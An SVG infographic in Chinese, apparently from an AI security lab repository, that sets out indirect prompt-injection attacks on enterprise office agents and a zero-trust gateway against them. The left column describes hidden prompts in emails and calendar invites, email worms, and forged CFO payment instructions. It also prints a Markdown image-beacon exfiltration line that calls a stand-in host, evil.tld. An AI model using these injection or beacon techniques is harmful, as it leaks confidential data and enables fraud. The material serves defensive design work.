<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 680" width="1200" height="680">
  <defs>
    <linearGradient id="bg400" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#070B14"/>
      <stop offset="50%" stop-color="#0E172A"/>
      <stop offset="100%" stop-color="#111827"/>
    </linearGradient>
    <linearGradient id="hdr400" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#3B82F6"/>
      <stop offset="50%" stop-color="#8B5CF6"/>
      <stop offset="100%" stop-color="#EC4899"/>
    </linearGradient>
  </defs>
  <rect width="1200" height="680" fill="url(#bg400)" rx="16"/>
  <rect x="20" y="18" width="1160" height="72" rx="12" fill="#1E293B" stroke="#3B82F6" stroke-width="2"/>
  <text x="42" y="47" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="20" font-weight="700">🏆 Round 400 里程碑 · 企业智能办公 Agent (M365 Copilot / Workspace / CRM) 防间接注入零信任架构指南</text>
  <text x="42" y="73" fill="#93C5FD" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">BRK-809 &amp; BRK-810 · 🏆 历史性突破 400 篇双语 FAQ、BRK-810 &amp; 1,722 项确定性断言大满贯！ · 防零点击邮件/日历蠕虫与图像信标外泄</text>

  <!-- Left Column: Threats -->
  <rect x="24" y="106" width="368" height="476" rx="12" fill="#1A121C" stroke="#EF4444" stroke-width="1.5"/>
  <text x="42" y="136" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">⛔ 智能办公连接邮件/日历/CRM 三大攻击链</text>

  <rect x="38" y="152" width="340" height="132" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="174" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">1. 零点击邮件/日历邀请触发跨源搜索泄密 (BRK-809)</text>
  <text x="50" y="196" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 外部发来含隐藏 Prompt 的邮件或 `.ics` 日历邀请自动进收件箱</text>
  <text x="50" y="216" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 当用户问“总结今天待办”时，诱导 Agent 跨源检索 SharePoint/CRM</text>
  <text x="50" y="236" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 越权读取 restricted-budget 里的董事会并购纪要与战略报价单</text>
  <text x="50" y="258" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-weight="600" font-size="11">→ 跨连接器数据拼接导致外部一封邮件抽干内部 OneDrive/CRM</text>

  <rect x="38" y="298" width="340" height="132" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="320" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">2. Markdown 图像信标静默外传与自动转发蠕虫 (BRK-809)</text>
  <text x="50" y="342" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 渲染 `![img](https://evil.tld/log?data=BASE64)` 零点击外泄</text>
  <text x="50" y="362" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 篡改 business-result 自动创建 Outlook 隐藏转发规则或改 CRM</text>
  <text x="50" y="382" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 借用受害者身份向全公司通讯录群发带毒 Teams/邮件蠕虫</text>
  <text x="50" y="404" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11" font-weight="600">→ 复刻 EchoLeak / Morris II 零点击 AI 邮件蠕虫横向传染全公司</text>

  <rect x="38" y="444" width="340" height="122" rx="8" fill="#2A121A" stroke="#DC2626" stroke-width="1"/>
  <text x="50" y="466" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">3. 会议纪要伪造高管口头批示触发电汇诈骗 (BRK-810)</text>
  <text x="50" y="488" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 外部参会者在 Teams 聊天框或共享文档植入伪造 CFO 批示</text>
  <text x="50" y="508" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 会后 AI 自动提取 Action Items 攻击 trust-registry 改供应商账号</text>
  <text x="50" y="528" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 诱导下游 ERP 助手直接发起 $7,300 紧急合同付款</text>
  <text x="50" y="550" fill="#F87171" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11" font-weight="600">→ 从“会议纪要自动生成待办”直接演变为“全自动越权付款”</text>

  <!-- Center Column: Zero-Trust Broker -->
  <rect x="408" y="106" width="384" height="476" rx="12" fill="#0F1E2E" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="428" y="136" fill="#93C5FD" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">🛡️ 智能办公防间接注入六层零信任网关 (Hardened)</text>

  <rect x="424" y="152" width="352" height="96" rx="8" fill="#162A3E" stroke="#38BDF8" stroke-width="1"/>
  <text x="438" y="174" fill="#7DD3FC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 1：外部邮件/日历污点传染与跨源检索降权</text>
  <text x="438" y="196" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 一旦上下文混入外部邮件/ICS/网页，整轮会话标记 untrusted=True</text>
  <text x="438" y="216" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 污点态下物理阻断跨源拉取 Purview `Highly Confidential` 文档</text>
  <text x="438" y="234" fill="#38BDF8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 斩断“外部邮件指挥 Agent 去内部网盘翻箱倒柜”的混合检索链</text>

  <rect x="424" y="258" width="352" height="96" rx="8" fill="#162A3E" stroke="#10B981" stroke-width="1"/>
  <text x="438" y="280" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 2：高管机密库气隙与 CSP 图像/链接零外呼锁</text>
  <text x="438" y="302" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 董事会并购卷宗与战略底价存入 restricted-budget 气隙</text>
  <text x="438" y="322" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• UI 强制 `CSP: img-src 'self'` 剥离外部 Markdown 图片与链接参数</text>
  <text x="438" y="340" fill="#34D399" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 100% 免疫 EchoLeak 零点击图像渲染信标与超链接预加载泄密</text>

  <rect x="424" y="364" width="352" height="100" rx="8" fill="#162A3E" stroke="#F59E0B" stroke-width="1"/>
  <text x="438" y="386" fill="#FDE68A" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 3：外发邮件/CRM 变更强制只存草稿 (`Draft-Only`)</text>
  <text x="438" y="408" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 污点态下严禁直接调用 `SendMail`、写转发规则或改 CRM 商机</text>
  <text x="438" y="428" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• 仅允许生成本地未发送草稿，阻断 `send_message` 向外部域外发</text>
  <text x="438" y="448" fill="#FBBF24" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ untrusted-write + restricted-data-boundary 彻底掐死 AI 蠕虫</text>

  <rect x="424" y="474" width="352" height="92" rx="8" fill="#162A3E" stroke="#F43F5E" stroke-width="1"/>
  <text x="438" y="496" fill="#FDA4AF" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">闸门 4：会议纪要待办与 ERP 资金划拨物理脱钩</text>
  <text x="438" y="518" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• tool-allowlist 禁用 update_trust + fixed-business-output</text>
  <text x="438" y="538" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">• original-requester-payment 拦截 $7,300 会议纪要伪造电汇</text>
  <text x="438" y="556" fill="#FB7185" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">→ 任何会议转录文本生成的待办绝不具备触发 ERP 付款的权限</text>

  <!-- Right Column: Matrix & Metrics -->
  <rect x="808" y="106" width="368" height="476" rx="12" fill="#111C24" stroke="#10B981" stroke-width="1.5"/>
  <text x="826" y="136" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="16" font-weight="700">📊 架构对比与 400 篇双语 FAQ 大满贯！</text>

  <rect x="822" y="152" width="340" height="196" rx="8" fill="#172A36" stroke="#334155" stroke-width="1"/>
  <text x="836" y="176" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">智能办公 Agent 间接注入防护方案对比：</text>
  <text x="836" y="200" fill="#6EE7B7" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12" font-weight="700">1. 确定性污点网关 + Purview DKE + CSP 锁 (🏆)</text>
  <text x="836" y="218" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   BRK-809/810 100% 拦截 | 零点击图像外泄与蠕虫传播率为 0</text>
  <text x="836" y="240" fill="#FCD34D" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">2. M365 Copilot / Workspace Gemini 默认配置</text>
  <text x="836" y="258" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   若未配 Purview 敏感标签隔离且挂载了自定义写插件则易受跨源注入</text>
  <text x="836" y="280" fill="#FCD34D" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">3. 仅靠入站邮件网关 (SEG) 扫钓鱼链接</text>
  <text x="836" y="298" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   纯自然语言提示词注入不含恶意 URL 或木马，邮件网关 100% 放行</text>
  <text x="836" y="320" fill="#FCA5A5" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">4. 允许办公 Agent 自动外发邮件并直接修改 CRM/ERP</text>
  <text x="836" y="338" fill="#CBD5E1" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">   一封外部日历邀请即可控制高管数字分身向全网发信与改单</text>

  <rect x="822" y="362" width="340" height="204" rx="8" fill="#0D2329" stroke="#3B82F6" stroke-width="2"/>
  <text x="836" y="388" fill="#93C5FD" font-family="Segoe UI, PingFang SC, sans-serif" font-size="14" font-weight="700">🏆 确定性基准回归达成 (Round 400 大满贯！)</text>
  <text x="836" y="414" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 对抗演练场景总数：<tspan fill="#93C5FD" font-weight="700">828 个</tspan> (825 对抗 + 3 基线)</text>
  <text x="836" y="438" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• Pytest 参数化检查：<tspan fill="#6EE7B7" font-weight="700">986 项 100% PASS</tspan></text>
  <text x="836" y="462" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 确定性策略断言数：<tspan fill="#FBBF24" font-weight="700">1,722 项</tspan> (🏆 突破 1,722 里程碑！)</text>
  <text x="836" y="486" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 交互式靶场攻击向量：<tspan fill="#F472B6" font-weight="700">814 个</tspan></text>
  <text x="836" y="510" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">• 双语架构与选型指南：<tspan fill="#A78BFA" font-weight="700">400 篇 FAQ (219 篇指南)</tspan> (🏆 400 篇！)</text>
  <text x="836" y="538" fill="#94A3B8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="11">新增测试：BRK-809 (EchoLeak 跨源注入) &amp; BRK-810 (🏆 BRK-810 里程碑！)</text>

  <!-- Footer -->
  <rect x="20" y="596" width="1160" height="64" rx="10" fill="#1E293B" stroke="#475569" stroke-width="1"/>
  <text x="42" y="622" fill="#F8FAFC" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13" font-weight="700">架构师核心铁律：</text>
  <text x="155" y="622" fill="#E2E8F0" font-family="Segoe UI, PingFang SC, sans-serif" font-size="13">当办公 Agent 会话混入外部邮件/日历/网页时，必须降权禁止跨源检索高密文档、强制 CSP 禁外部图片渲染，且外发动作一律锁死为只存草稿！</text>
  <text x="42" y="644" fill="#94A3B8" font-family="Segoe UI, PingFang SC, sans-serif" font-size="12">Repository: turbo998/ai-security-lab (main) · Enterprise AI Security Architecture &amp; Product Selection Series · Round 400 (2026-11-20)</text>
</svg>
